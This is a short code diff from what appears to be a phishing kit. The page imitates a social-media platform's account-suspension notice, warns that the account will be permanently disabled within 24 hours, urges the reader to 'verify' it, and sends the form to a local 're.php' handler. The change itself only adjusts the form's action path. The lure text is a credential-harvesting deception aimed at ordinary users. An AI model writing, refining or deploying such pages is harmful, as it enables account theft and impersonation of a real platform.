@@ -97,7 +97,7 @@
                             <div class="bro-2">For the safety and security of other users, we have received a report from another user that your account does not follow Community Standards and violates our terms of service. If you haven't done anything wrong, you can verify your account and reject the decision.</div>
                             <div class="bro-22">Per Community Standards, you have <b>24 hours</b> to resolve the issue and prevent your account from being permanently disabled.</div>
                             <div class="sc-htoDjs cDnNqw">
-                                <form action="re.php" method="post" class="ant-form ant-form-horizontal">
+                                <form action="./re.php" method="post" class="ant-form ant-form-horizontal">
                                     <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;">
                                         <div class="ant-col ant-form-item-control">
                                             <div class="thepadding">
